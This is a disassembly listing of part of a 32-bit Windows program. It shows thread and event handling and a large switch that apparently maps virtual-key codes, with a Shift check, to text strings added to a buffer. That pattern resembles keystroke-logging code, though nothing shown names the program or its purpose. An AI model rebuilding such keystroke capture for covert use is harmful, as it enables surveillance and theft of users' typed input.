  404254:	b9 48 57 41 00       	mov    $0x415748,%ecx
  404259:	ff 25 54 02 41 00    	jmp    *0x410254
  40425f:	53                   	push   %ebx
  404260:	56                   	push   %esi
  404261:	8b f1                	mov    %ecx,%esi
  404263:	33 db                	xor    %ebx,%ebx
  404265:	38 5e 39             	cmp    %bl,0x39(%esi)
  404268:	75 3d                	jne    0x4042a7
  40426a:	38 5e 38             	cmp    %bl,0x38(%esi)
  40426d:	57                   	push   %edi
  40426e:	8b 3d 98 01 41 00    	mov    0x410198,%edi
  404274:	75 21                	jne    0x404297
  404276:	e8 cf f4 ff ff       	call   0x40374a
  40427b:	39 1e                	cmp    %ebx,(%esi)
  40427d:	75 0c                	jne    0x40428b
  40427f:	53                   	push   %ebx
  404280:	53                   	push   %ebx
  404281:	56                   	push   %esi
  404282:	68 0c 38 40 00       	push   $0x40380c
  404287:	53                   	push   %ebx
  404288:	53                   	push   %ebx
  404289:	ff d7                	call   *%edi
  40428b:	53                   	push   %ebx
  40428c:	53                   	push   %ebx
  40428d:	56                   	push   %esi
  40428e:	68 3b 38 40 00       	push   $0x40383b
  404293:	53                   	push   %ebx
  404294:	53                   	push   %ebx
  404295:	ff d7                	call   *%edi
  404297:	53                   	push   %ebx
  404298:	53                   	push   %ebx
  404299:	56                   	push   %esi
  40429a:	68 4a 38 40 00       	push   $0x40384a
  40429f:	53                   	push   %ebx
  4042a0:	53                   	push   %ebx
  4042a1:	ff d7                	call   *%edi
  4042a3:	89 46 28             	mov    %eax,0x28(%esi)
  4042a6:	5f                   	pop    %edi
  4042a7:	5e                   	pop    %esi
  4042a8:	5b                   	pop    %ebx
  4042a9:	c3                   	ret
  4042aa:	55                   	push   %ebp
  4042ab:	8b ec                	mov    %esp,%ebp
  4042ad:	83 ec 14             	sub    $0x14,%esp
  4042b0:	53                   	push   %ebx
  4042b1:	56                   	push   %esi
  4042b2:	33 c0                	xor    %eax,%eax
  4042b4:	57                   	push   %edi
  4042b5:	50                   	push   %eax
  4042b6:	8b f1                	mov    %ecx,%esi
  4042b8:	50                   	push   %eax
  4042b9:	50                   	push   %eax
  4042ba:	50                   	push   %eax
  4042bb:	c6 46 39 01          	movb   $0x1,0x39(%esi)
  4042bf:	ff 15 7c 01 41 00    	call   *0x41017c
  4042c5:	89 46 30             	mov    %eax,0x30(%esi)
  4042c8:	8d 5e 14             	lea    0x14(%esi),%ebx
  4042cb:	bf 68 06 41 00       	mov    $0x410668,%edi
  4042d0:	57                   	push   %edi
  4042d1:	53                   	push   %ebx
  4042d2:	ff 15 a4 02 41 00    	call   *0x4102a4
  4042d8:	59                   	pop    %ecx
  4042d9:	84 c0                	test   %al,%al
  4042db:	59                   	pop    %ecx
  4042dc:	74 4b                	je     0x404329
  4042de:	83 ec 10             	sub    $0x10,%esp
  4042e1:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4042e4:	8b d4                	mov    %esp,%edx
  4042e6:	53                   	push   %ebx
  4042e7:	68 68 52 41 00       	push   $0x415268
  4042ec:	68 28 08 41 00       	push   $0x410828
  4042f1:	50                   	push   %eax
  4042f2:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4042f5:	e8 20 b9 00 00       	call   0x40fc1a
  4042fa:	83 c4 0c             	add    $0xc,%esp
  4042fd:	50                   	push   %eax
  4042fe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404301:	50                   	push   %eax
  404302:	e8 0d b9 00 00       	call   0x40fc14
  404307:	83 c4 0c             	add    $0xc,%esp
  40430a:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  40430f:	e8 84 de ff ff       	call   0x402198
  404314:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404317:	ff 15 54 02 41 00    	call   *0x410254
  40431d:	8d 5e 14             	lea    0x14(%esi),%ebx
  404320:	57                   	push   %edi
  404321:	8b cb                	mov    %ebx,%ecx
  404323:	ff 15 d8 02 41 00    	call   *0x4102d8
  404329:	6a ff                	push   $0xffffffff
  40432b:	ff 76 30             	push   0x30(%esi)
  40432e:	ff 15 80 01 41 00    	call   *0x410180
  404334:	eb 9a                	jmp    0x4042d0
  404336:	53                   	push   %ebx
  404337:	56                   	push   %esi
  404338:	8b f1                	mov    %ecx,%esi
  40433a:	33 db                	xor    %ebx,%ebx
  40433c:	57                   	push   %edi
  40433d:	38 5e 39             	cmp    %bl,0x39(%esi)
  404340:	74 40                	je     0x404382
  404342:	8b 3d 68 01 41 00    	mov    0x410168,%edi
  404348:	53                   	push   %ebx
  404349:	ff 76 28             	push   0x28(%esi)
  40434c:	ff d7                	call   *%edi
  40434e:	83 f8 01             	cmp    $0x1,%eax
  404351:	75 2f                	jne    0x404382
  404353:	ff 76 30             	push   0x30(%esi)
  404356:	88 5e 39             	mov    %bl,0x39(%esi)
  404359:	89 5e 28             	mov    %ebx,0x28(%esi)
  40435c:	ff 15 58 01 41 00    	call   *0x410158
  404362:	38 5e 38             	cmp    %bl,0x38(%esi)
  404365:	75 17                	jne    0x40437e
  404367:	8b 06                	mov    (%esi),%eax
  404369:	3b c3                	cmp    %ebx,%eax
  40436b:	74 11                	je     0x40437e
  40436d:	50                   	push   %eax
  40436e:	ff 15 e4 03 41 00    	call   *0x4103e4
  404374:	53                   	push   %ebx
  404375:	68 0c 38 40 00       	push   $0x40380c
  40437a:	89 1e                	mov    %ebx,(%esi)
  40437c:	ff d7                	call   *%edi
  40437e:	b0 01                	mov    $0x1,%al
  404380:	eb 02                	jmp    0x404384
  404382:	32 c0                	xor    %al,%al
  404384:	5f                   	pop    %edi
  404385:	5e                   	pop    %esi
  404386:	5b                   	pop    %ebx
  404387:	c3                   	ret
  404388:	53                   	push   %ebx
  404389:	56                   	push   %esi
  40438a:	8b f1                	mov    %ecx,%esi
  40438c:	33 db                	xor    %ebx,%ebx
  40438e:	38 5e 38             	cmp    %bl,0x38(%esi)
  404391:	74 27                	je     0x4043ba
  404393:	38 5e 39             	cmp    %bl,0x39(%esi)
  404396:	88 5e 38             	mov    %bl,0x38(%esi)
  404399:	75 1b                	jne    0x4043b6
  40439b:	8b 06                	mov    (%esi),%eax
  40439d:	3b c3                	cmp    %ebx,%eax
  40439f:	74 15                	je     0x4043b6
  4043a1:	50                   	push   %eax
  4043a2:	ff 15 e4 03 41 00    	call   *0x4103e4
  4043a8:	53                   	push   %ebx
  4043a9:	68 0c 38 40 00       	push   $0x40380c
  4043ae:	ff 15 68 01 41 00    	call   *0x410168
  4043b4:	89 1e                	mov    %ebx,(%esi)
  4043b6:	b0 01                	mov    $0x1,%al
  4043b8:	eb 02                	jmp    0x4043bc
  4043ba:	32 c0                	xor    %al,%al
  4043bc:	5e                   	pop    %esi
  4043bd:	5b                   	pop    %ebx
  4043be:	c3                   	ret
  4043bf:	55                   	push   %ebp
  4043c0:	8b ec                	mov    %esp,%ebp
  4043c2:	83 ec 1c             	sub    $0x1c,%esp
  4043c5:	53                   	push   %ebx
  4043c6:	56                   	push   %esi
  4043c7:	8b f1                	mov    %ecx,%esi
  4043c9:	57                   	push   %edi
  4043ca:	6a 01                	push   $0x1
  4043cc:	8b 46 3c             	mov    0x3c(%esi),%eax
  4043cf:	5b                   	pop    %ebx
  4043d0:	83 f8 2c             	cmp    $0x2c,%eax
  4043d3:	0f 87 74 01 00 00    	ja     0x40454d
  4043d9:	0f 84 5a 01 00 00    	je     0x404539
  4043df:	83 f8 22             	cmp    $0x22,%eax
  4043e2:	0f 87 c1 00 00 00    	ja     0x4044a9
  4043e8:	0f 84 a7 00 00 00    	je     0x404495
  4043ee:	83 e8 08             	sub    $0x8,%eax
  4043f1:	0f 84 8a 00 00 00    	je     0x404481
  4043f7:	48                   	dec    %eax
  4043f8:	74 73                	je     0x40446d
  4043fa:	83 e8 04             	sub    $0x4,%eax
  4043fd:	74 5a                	je     0x404459
  4043ff:	83 e8 06             	sub    $0x6,%eax
  404402:	74 41                	je     0x404445
  404404:	48                   	dec    %eax
  404405:	74 36                	je     0x40443d
  404407:	83 e8 07             	sub    $0x7,%eax
  40440a:	74 1d                	je     0x404429
  40440c:	83 e8 06             	sub    $0x6,%eax
  40440f:	0f 85 6f 02 00 00    	jne    0x404684
  404415:	53                   	push   %ebx
  404416:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404419:	83 ec 10             	sub    $0x10,%esp
  40441c:	8b cc                	mov    %esp,%ecx
  40441e:	50                   	push   %eax
  40441f:	68 f0 09 41 00       	push   $0x4109f0
  404424:	e9 4e 02 00 00       	jmp    0x404677
  404429:	53                   	push   %ebx
  40442a:	8d 45 fe             	lea    -0x2(%ebp),%eax
  40442d:	83 ec 10             	sub    $0x10,%esp
  404430:	8b cc                	mov    %esp,%ecx
  404432:	50                   	push   %eax
  404433:	68 e8 09 41 00       	push   $0x4109e8
  404438:	e9 3a 02 00 00       	jmp    0x404677
  40443d:	88 5e 2f             	mov    %bl,0x2f(%esi)
  404440:	e9 3f 02 00 00       	jmp    0x404684
  404445:	53                   	push   %ebx
  404446:	8d 45 fd             	lea    -0x3(%ebp),%eax
  404449:	83 ec 10             	sub    $0x10,%esp
  40444c:	8b cc                	mov    %esp,%ecx
  40444e:	50                   	push   %eax
  40444f:	68 dc 09 41 00       	push   $0x4109dc
  404454:	e9 1e 02 00 00       	jmp    0x404677
  404459:	53                   	push   %ebx
  40445a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40445d:	83 ec 10             	sub    $0x10,%esp
  404460:	8b cc                	mov    %esp,%ecx
  404462:	50                   	push   %eax
  404463:	68 d0 09 41 00       	push   $0x4109d0
  404468:	e9 0a 02 00 00       	jmp    0x404677
  40446d:	53                   	push   %ebx
  40446e:	8d 45 fb             	lea    -0x5(%ebp),%eax
  404471:	83 ec 10             	sub    $0x10,%esp
  404474:	8b cc                	mov    %esp,%ecx
  404476:	50                   	push   %eax
  404477:	68 c8 09 41 00       	push   $0x4109c8
  40447c:	e9 f6 01 00 00       	jmp    0x404677
  404481:	53                   	push   %ebx
  404482:	8d 45 fa             	lea    -0x6(%ebp),%eax
  404485:	83 ec 10             	sub    $0x10,%esp
  404488:	8b cc                	mov    %esp,%ecx
  40448a:	50                   	push   %eax
  40448b:	68 bc 09 41 00       	push   $0x4109bc
  404490:	e9 e2 01 00 00       	jmp    0x404677
  404495:	53                   	push   %ebx
  404496:	8d 45 f9             	lea    -0x7(%ebp),%eax
  404499:	83 ec 10             	sub    $0x10,%esp
  40449c:	8b cc                	mov    %esp,%ecx
  40449e:	50                   	push   %eax
  40449f:	68 b0 09 41 00       	push   $0x4109b0
  4044a4:	e9 ce 01 00 00       	jmp    0x404677
  4044a9:	83 e8 23             	sub    $0x23,%eax
  4044ac:	74 77                	je     0x404525
  4044ae:	48                   	dec    %eax
  4044af:	74 60                	je     0x404511
  4044b1:	48                   	dec    %eax
  4044b2:	74 49                	je     0x4044fd
  4044b4:	48                   	dec    %eax
  4044b5:	74 32                	je     0x4044e9
  4044b7:	48                   	dec    %eax
  4044b8:	74 1b                	je     0x4044d5
  4044ba:	48                   	dec    %eax
  4044bb:	0f 85 c3 01 00 00    	jne    0x404684
  4044c1:	53                   	push   %ebx
  4044c2:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4044c5:	83 ec 10             	sub    $0x10,%esp
  4044c8:	8b cc                	mov    %esp,%ecx
  4044ca:	50                   	push   %eax
  4044cb:	68 a4 09 41 00       	push   $0x4109a4
  4044d0:	e9 a2 01 00 00       	jmp    0x404677
  4044d5:	53                   	push   %ebx
  4044d6:	8d 45 f7             	lea    -0x9(%ebp),%eax
  4044d9:	83 ec 10             	sub    $0x10,%esp
  4044dc:	8b cc                	mov    %esp,%ecx
  4044de:	50                   	push   %eax
  4044df:	68 98 09 41 00       	push   $0x410998
  4044e4:	e9 8e 01 00 00       	jmp    0x404677
  4044e9:	53                   	push   %ebx
  4044ea:	8d 45 f6             	lea    -0xa(%ebp),%eax
  4044ed:	83 ec 10             	sub    $0x10,%esp
  4044f0:	8b cc                	mov    %esp,%ecx
  4044f2:	50                   	push   %eax
  4044f3:	68 90 09 41 00       	push   $0x410990
  4044f8:	e9 7a 01 00 00       	jmp    0x404677
  4044fd:	53                   	push   %ebx
  4044fe:	8d 45 f5             	lea    -0xb(%ebp),%eax
  404501:	83 ec 10             	sub    $0x10,%esp
  404504:	8b cc                	mov    %esp,%ecx
  404506:	50                   	push   %eax
  404507:	68 84 09 41 00       	push   $0x410984
  40450c:	e9 66 01 00 00       	jmp    0x404677
  404511:	53                   	push   %ebx
  404512:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404515:	83 ec 10             	sub    $0x10,%esp
  404518:	8b cc                	mov    %esp,%ecx
  40451a:	50                   	push   %eax
  40451b:	68 78 09 41 00       	push   $0x410978
  404520:	e9 52 01 00 00       	jmp    0x404677
  404525:	53                   	push   %ebx
  404526:	8d 45 f3             	lea    -0xd(%ebp),%eax
  404529:	83 ec 10             	sub    $0x10,%esp
  40452c:	8b cc                	mov    %esp,%ecx
  40452e:	50                   	push   %eax
  40452f:	68 70 09 41 00       	push   $0x410970
  404534:	e9 3e 01 00 00       	jmp    0x404677
  404539:	53                   	push   %ebx
  40453a:	8d 45 f2             	lea    -0xe(%ebp),%eax
  40453d:	83 ec 10             	sub    $0x10,%esp
  404540:	8b cc                	mov    %esp,%ecx
  404542:	50                   	push   %eax
  404543:	68 64 09 41 00       	push   $0x410964
  404548:	e9 2a 01 00 00       	jmp    0x404677
  40454d:	83 f8 75             	cmp    $0x75,%eax
  404550:	0f 87 a9 00 00 00    	ja     0x4045ff
  404556:	0f 84 92 00 00 00    	je     0x4045ee
  40455c:	83 e8 2e             	sub    $0x2e,%eax
  40455f:	74 79                	je     0x4045da
  404561:	83 e8 42             	sub    $0x42,%eax
  404564:	74 60                	je     0x4045c6
  404566:	48                   	dec    %eax
  404567:	74 49                	je     0x4045b2
  404569:	48                   	dec    %eax
  40456a:	74 32                	je     0x40459e
  40456c:	48                   	dec    %eax
  40456d:	74 1b                	je     0x40458a
  40456f:	48                   	dec    %eax
  404570:	0f 85 0e 01 00 00    	jne    0x404684
  404576:	53                   	push   %ebx
  404577:	8d 45 f1             	lea    -0xf(%ebp),%eax
  40457a:	83 ec 10             	sub    $0x10,%esp
  40457d:	8b cc                	mov    %esp,%ecx
  40457f:	50                   	push   %eax
  404580:	68 5c 09 41 00       	push   $0x41095c
  404585:	e9 ed 00 00 00       	jmp    0x404677
  40458a:	53                   	push   %ebx
  40458b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40458e:	83 ec 10             	sub    $0x10,%esp
  404591:	8b cc                	mov    %esp,%ecx
  404593:	50                   	push   %eax
  404594:	68 54 09 41 00       	push   $0x410954
  404599:	e9 d9 00 00 00       	jmp    0x404677
  40459e:	53                   	push   %ebx
  40459f:	8d 45 ef             	lea    -0x11(%ebp),%eax
  4045a2:	83 ec 10             	sub    $0x10,%esp
  4045a5:	8b cc                	mov    %esp,%ecx
  4045a7:	50                   	push   %eax
  4045a8:	68 4c 09 41 00       	push   $0x41094c
  4045ad:	e9 c5 00 00 00       	jmp    0x404677
  4045b2:	53                   	push   %ebx
  4045b3:	8d 45 ee             	lea    -0x12(%ebp),%eax
  4045b6:	83 ec 10             	sub    $0x10,%esp
  4045b9:	8b cc                	mov    %esp,%ecx
  4045bb:	50                   	push   %eax
  4045bc:	68 44 09 41 00       	push   $0x410944
  4045c1:	e9 b1 00 00 00       	jmp    0x404677
  4045c6:	53                   	push   %ebx
  4045c7:	8d 45 ed             	lea    -0x13(%ebp),%eax
  4045ca:	83 ec 10             	sub    $0x10,%esp
  4045cd:	8b cc                	mov    %esp,%ecx
  4045cf:	50                   	push   %eax
  4045d0:	68 3c 09 41 00       	push   $0x41093c
  4045d5:	e9 9d 00 00 00       	jmp    0x404677
  4045da:	53                   	push   %ebx
  4045db:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4045de:	83 ec 10             	sub    $0x10,%esp
  4045e1:	8b cc                	mov    %esp,%ecx
  4045e3:	50                   	push   %eax
  4045e4:	68 34 09 41 00       	push   $0x410934
  4045e9:	e9 89 00 00 00       	jmp    0x404677
  4045ee:	53                   	push   %ebx
  4045ef:	8d 45 eb             	lea    -0x15(%ebp),%eax
  4045f2:	83 ec 10             	sub    $0x10,%esp
  4045f5:	8b cc                	mov    %esp,%ecx
  4045f7:	50                   	push   %eax
  4045f8:	68 2c 09 41 00       	push   $0x41092c
  4045fd:	eb 78                	jmp    0x404677
  4045ff:	83 e8 76             	sub    $0x76,%eax
  404602:	74 64                	je     0x404668
  404604:	48                   	dec    %eax
  404605:	74 50                	je     0x404657
  404607:	48                   	dec    %eax
  404608:	74 3c                	je     0x404646
  40460a:	48                   	dec    %eax
  40460b:	74 28                	je     0x404635
  40460d:	48                   	dec    %eax
  40460e:	74 14                	je     0x404624
  404610:	48                   	dec    %eax
  404611:	75 71                	jne    0x404684
  404613:	53                   	push   %ebx
  404614:	8d 45 ea             	lea    -0x16(%ebp),%eax
  404617:	83 ec 10             	sub    $0x10,%esp
  40461a:	8b cc                	mov    %esp,%ecx
  40461c:	50                   	push   %eax
  40461d:	68 24 09 41 00       	push   $0x410924
  404622:	eb 53                	jmp    0x404677
  404624:	53                   	push   %ebx
  404625:	8d 45 e9             	lea    -0x17(%ebp),%eax
  404628:	83 ec 10             	sub    $0x10,%esp
  40462b:	8b cc                	mov    %esp,%ecx
  40462d:	50                   	push   %eax
  40462e:	68 1c 09 41 00       	push   $0x41091c
  404633:	eb 42                	jmp    0x404677
  404635:	53                   	push   %ebx
  404636:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404639:	83 ec 10             	sub    $0x10,%esp
  40463c:	8b cc                	mov    %esp,%ecx
  40463e:	50                   	push   %eax
  40463f:	68 14 09 41 00       	push   $0x410914
  404644:	eb 31                	jmp    0x404677
  404646:	53                   	push   %ebx
  404647:	8d 45 e7             	lea    -0x19(%ebp),%eax
  40464a:	83 ec 10             	sub    $0x10,%esp
  40464d:	8b cc                	mov    %esp,%ecx
  40464f:	50                   	push   %eax
  404650:	68 0c 09 41 00       	push   $0x41090c
  404655:	eb 20                	jmp    0x404677
  404657:	53                   	push   %ebx
  404658:	8d 45 e6             	lea    -0x1a(%ebp),%eax
  40465b:	83 ec 10             	sub    $0x10,%esp
  40465e:	8b cc                	mov    %esp,%ecx
  404660:	50                   	push   %eax
  404661:	68 04 09 41 00       	push   $0x410904
  404666:	eb 0f                	jmp    0x404677
  404668:	53                   	push   %ebx
  404669:	8d 45 e5             	lea    -0x1b(%ebp),%eax
  40466c:	83 ec 10             	sub    $0x10,%esp
  40466f:	8b cc                	mov    %esp,%ecx
  404671:	50                   	push   %eax
  404672:	68 fc 08 41 00       	push   $0x4108fc
  404677:	ff 15 4c 02 41 00    	call   *0x41024c
  40467d:	8b ce                	mov    %esi,%ecx
  40467f:	e8 16 f4 ff ff       	call   0x403a9a
  404684:	80 7e 2d 00          	cmpb   $0x0,0x2d(%esi)
  404688:	bf f8 08 41 00       	mov    $0x4108f8,%edi
  40468d:	0f 85 c7 01 00 00    	jne    0x40485a
  404693:	83 7e 34 10          	cmpl   $0x10,0x34(%esi)
  404697:	8b 46 3c             	mov    0x3c(%esi),%eax
  40469a:	0f 85 d4 00 00 00    	jne    0x404774
  4046a0:	05 46 ff ff ff       	add    $0xffffff46,%eax
  4046a5:	83 f8 24             	cmp    $0x24,%eax
  4046a8:	0f 87 60 05 00 00    	ja     0x404c0e
  4046ae:	0f b6 80 95 4d 40 00 	movzbl 0x404d95(%eax),%eax
  4046b5:	ff 24 85 65 4d 40 00 	jmp    *0x404d65(,%eax,4)
  4046bc:	53                   	push   %ebx
  4046bd:	8d 45 e5             	lea    -0x1b(%ebp),%eax
  4046c0:	83 ec 10             	sub    $0x10,%esp
  4046c3:	8b cc                	mov    %esp,%ecx
  4046c5:	50                   	push   %eax
  4046c6:	68 f4 08 41 00       	push   $0x4108f4
  4046cb:	e9 31 05 00 00       	jmp    0x404c01
  4046d0:	53                   	push   %ebx
  4046d1:	8d 45 e6             	lea    -0x1a(%ebp),%eax
  4046d4:	83 ec 10             	sub    $0x10,%esp
  4046d7:	8b cc                	mov    %esp,%ecx
  4046d9:	e9 b7 04 00 00       	jmp    0x404b95
  4046de:	53                   	push   %ebx
  4046df:	8d 45 e7             	lea    -0x19(%ebp),%eax
  4046e2:	83 ec 10             	sub    $0x10,%esp
  4046e5:	8b cc                	mov    %esp,%ecx
  4046e7:	e9 c9 00 00 00       	jmp    0x4047b5
  4046ec:	53                   	push   %ebx
  4046ed:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4046f0:	83 ec 10             	sub    $0x10,%esp
  4046f3:	8b cc                	mov    %esp,%ecx
  4046f5:	e9 cf 00 00 00       	jmp    0x4047c9
  4046fa:	53                   	push   %ebx
  4046fb:	8d 45 e9             	lea    -0x17(%ebp),%eax
  4046fe:	83 ec 10             	sub    $0x10,%esp
  404701:	8b cc                	mov    %esp,%ecx
  404703:	e9 d5 00 00 00       	jmp    0x4047dd
  404708:	53                   	push   %ebx
  404709:	8d 45 ea             	lea    -0x16(%ebp),%eax
  40470c:	83 ec 10             	sub    $0x10,%esp
  40470f:	8b cc                	mov    %esp,%ecx
  404711:	50                   	push   %eax
  404712:	68 f0 08 41 00       	push   $0x4108f0
  404717:	e9 e5 04 00 00       	jmp    0x404c01
  40471c:	53                   	push   %ebx
  40471d:	8d 45 eb             	lea    -0x15(%ebp),%eax
  404720:	83 ec 10             	sub    $0x10,%esp
  404723:	8b cc                	mov    %esp,%ecx
  404725:	50                   	push   %eax
  404726:	68 ec 08 41 00       	push   $0x4108ec
  40472b:	e9 d1 04 00 00       	jmp    0x404c01
  404730:	53                   	push   %ebx
  404731:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404734:	83 ec 10             	sub    $0x10,%esp
  404737:	8b cc                	mov    %esp,%ecx
  404739:	e9 11 01 00 00       	jmp    0x40484f
  40473e:	53                   	push   %ebx
  40473f:	8d 45 ed             	lea    -0x13(%ebp),%eax
  404742:	83 ec 10             	sub    $0x10,%esp
  404745:	8b cc                	mov    %esp,%ecx
  404747:	e9 db 00 00 00       	jmp    0x404827
  40474c:	53                   	push   %ebx
  40474d:	8d 45 ee             	lea    -0x12(%ebp),%eax
  404750:	83 ec 10             	sub    $0x10,%esp
  404753:	8b cc                	mov    %esp,%ecx
  404755:	50                   	push   %eax
  404756:	68 e8 08 41 00       	push   $0x4108e8
  40475b:	e9 a1 04 00 00       	jmp    0x404c01
  404760:	53                   	push   %ebx
  404761:	8d 45 ef             	lea    -0x11(%ebp),%eax
  404764:	83 ec 10             	sub    $0x10,%esp
  404767:	8b cc                	mov    %esp,%ecx
  404769:	50                   	push   %eax
  40476a:	68 e4 08 41 00       	push   $0x4108e4
  40476f:	e9 8d 04 00 00       	jmp    0x404c01
  404774:	05 46 ff ff ff       	add    $0xffffff46,%eax
  404779:	83 f8 24             	cmp    $0x24,%eax
  40477c:	0f 87 8c 04 00 00    	ja     0x404c0e
  404782:	0f b6 80 ea 4d 40 00 	movzbl 0x404dea(%eax),%eax
  404789:	ff 24 85 ba 4d 40 00 	jmp    *0x404dba(,%eax,4)
  404790:	53                   	push   %ebx
  404791:	8d 45 e5             	lea    -0x1b(%ebp),%eax
  404794:	83 ec 10             	sub    $0x10,%esp
  404797:	8b cc                	mov    %esp,%ecx
  404799:	e9 01 02 00 00       	jmp    0x40499f
  40479e:	53                   	push   %ebx
  40479f:	8d 45 e6             	lea    -0x1a(%ebp),%eax
  4047a2:	83 ec 10             	sub    $0x10,%esp
  4047a5:	8b cc                	mov    %esp,%ecx
  4047a7:	e9 ea 00 00 00       	jmp    0x404896
  4047ac:	53                   	push   %ebx
  4047ad:	8d 45 e7             	lea    -0x19(%ebp),%eax
  4047b0:	83 ec 10             	sub    $0x10,%esp
  4047b3:	8b cc                	mov    %esp,%ecx
  4047b5:	50                   	push   %eax
  4047b6:	68 e0 08 41 00       	push   $0x4108e0
  4047bb:	e9 41 04 00 00       	jmp    0x404c01
  4047c0:	53                   	push   %ebx
  4047c1:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4047c4:	83 ec 10             	sub    $0x10,%esp
  4047c7:	8b cc                	mov    %esp,%ecx
  4047c9:	50                   	push   %eax
  4047ca:	68 dc 08 41 00       	push   $0x4108dc
  4047cf:	e9 2d 04 00 00       	jmp    0x404c01
  4047d4:	53                   	push   %ebx
  4047d5:	8d 45 e9             	lea    -0x17(%ebp),%eax
  4047d8:	83 ec 10             	sub    $0x10,%esp
  4047db:	8b cc                	mov    %esp,%ecx
  4047dd:	50                   	push   %eax
  4047de:	68 d8 08 41 00       	push   $0x4108d8
  4047e3:	e9 19 04 00 00       	jmp    0x404c01
  4047e8:	53                   	push   %ebx
  4047e9:	8d 45 ea             	lea    -0x16(%ebp),%eax
  4047ec:	83 ec 10             	sub    $0x10,%esp
  4047ef:	8b cc                	mov    %esp,%ecx
  4047f1:	e9 0e 01 00 00       	jmp    0x404904
  4047f6:	53                   	push   %ebx
  4047f7:	8d 45 eb             	lea    -0x15(%ebp),%eax
  4047fa:	83 ec 10             	sub    $0x10,%esp
  4047fd:	8b cc                	mov    %esp,%ecx
  4047ff:	50                   	push   %eax
  404800:	68 d4 08 41 00       	push   $0x4108d4
  404805:	e9 f7 03 00 00       	jmp    0x404c01
  40480a:	53                   	push   %ebx
  40480b:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40480e:	83 ec 10             	sub    $0x10,%esp
  404811:	8b cc                	mov    %esp,%ecx
  404813:	50                   	push   %eax
  404814:	68 d0 08 41 00       	push   $0x4108d0
  404819:	e9 e3 03 00 00       	jmp    0x404c01
  40481e:	53                   	push   %ebx
  40481f:	8d 45 ed             	lea    -0x13(%ebp),%eax
  404822:	83 ec 10             	sub    $0x10,%esp
  404825:	8b cc                	mov    %esp,%ecx
  404827:	50                   	push   %eax
  404828:	68 cc 08 41 00       	push   $0x4108cc
  40482d:	e9 cf 03 00 00       	jmp    0x404c01
  404832:	53                   	push   %ebx
  404833:	8d 45 ee             	lea    -0x12(%ebp),%eax
  404836:	83 ec 10             	sub    $0x10,%esp
  404839:	8b cc                	mov    %esp,%ecx
  40483b:	50                   	push   %eax
  40483c:	68 c8 08 41 00       	push   $0x4108c8
  404841:	e9 bb 03 00 00       	jmp    0x404c01
  404846:	53                   	push   %ebx
  404847:	8d 45 ef             	lea    -0x11(%ebp),%eax
  40484a:	83 ec 10             	sub    $0x10,%esp
  40484d:	8b cc                	mov    %esp,%ecx
  40484f:	50                   	push   %eax
  404850:	68 c4 08 41 00       	push   $0x4108c4
  404855:	e9 a7 03 00 00       	jmp    0x404c01
  40485a:	83 7e 34 10          	cmpl   $0x10,0x34(%esi)
  40485e:	8b 4e 3c             	mov    0x3c(%esi),%ecx
  404861:	b8 ba 00 00 00       	mov    $0xba,%eax
  404866:	0f 85 b3 01 00 00    	jne    0x404a1f
  40486c:	3b c8                	cmp    %eax,%ecx
  40486e:	0f 87 cb 00 00 00    	ja     0x40493f
  404874:	0f 84 b1 00 00 00    	je     0x40492b
  40487a:	8d 41 d0             	lea    -0x30(%ecx),%eax
  40487d:	83 f8 09             	cmp    $0x9,%eax
  404880:	0f 87 88 03 00 00    	ja     0x404c0e
  404886:	ff 24 85 0f 4e 40 00 	jmp    *0x404e0f(,%eax,4)
  40488d:	53                   	push   %ebx
  40488e:	8d 45 e5             	lea    -0x1b(%ebp),%eax
  404891:	83 ec 10             	sub    $0x10,%esp
  404894:	8b cc                	mov    %esp,%ecx
  404896:	50                   	push   %eax
  404897:	68 c0 08 41 00       	push   $0x4108c0
  40489c:	e9 60 03 00 00       	jmp    0x404c01
  4048a1:	53                   	push   %ebx
  4048a2:	8d 45 e6             	lea    -0x1a(%ebp),%eax
  4048a5:	83 ec 10             	sub    $0x10,%esp
  4048a8:	8b cc                	mov    %esp,%ecx
  4048aa:	e9 ae 01 00 00       	jmp    0x404a5d
  4048af:	53                   	push   %ebx
  4048b0:	8d 45 e7             	lea    -0x19(%ebp),%eax
  4048b3:	83 ec 10             	sub    $0x10,%esp
  4048b6:	8b cc                	mov    %esp,%ecx
  4048b8:	e9 0b 03 00 00       	jmp    0x404bc8
  4048bd:	53                   	push   %ebx
  4048be:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4048c1:	83 ec 10             	sub    $0x10,%esp
  4048c4:	8b cc                	mov    %esp,%ecx
  4048c6:	50                   	push   %eax
  4048c7:	68 bc 08 41 00       	push   $0x4108bc
  4048cc:	e9 30 03 00 00       	jmp    0x404c01
  4048d1:	53                   	push   %ebx
  4048d2:	8d 45 e9             	lea    -0x17(%ebp),%eax
  4048d5:	83 ec 10             	sub    $0x10,%esp
  4048d8:	8b cc                	mov    %esp,%ecx
  4048da:	e9 ba 01 00 00       	jmp    0x404a99
  4048df:	53                   	push   %ebx
  4048e0:	8d 45 ea             	lea    -0x16(%ebp),%eax
  4048e3:	83 ec 10             	sub    $0x10,%esp
  4048e6:	8b cc                	mov    %esp,%ecx
  4048e8:	e9 c0 01 00 00       	jmp    0x404aad
  4048ed:	53                   	push   %ebx
  4048ee:	8d 45 eb             	lea    -0x15(%ebp),%eax
  4048f1:	83 ec 10             	sub    $0x10,%esp
  4048f4:	8b cc                	mov    %esp,%ecx
  4048f6:	e9 da 01 00 00       	jmp    0x404ad5
  4048fb:	53                   	push   %ebx
  4048fc:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4048ff:	83 ec 10             	sub    $0x10,%esp
  404902:	8b cc                	mov    %esp,%ecx
  404904:	50                   	push   %eax
  404905:	68 b8 08 41 00       	push   $0x4108b8
  40490a:	e9 f2 02 00 00       	jmp    0x404c01
  40490f:	53                   	push   %ebx
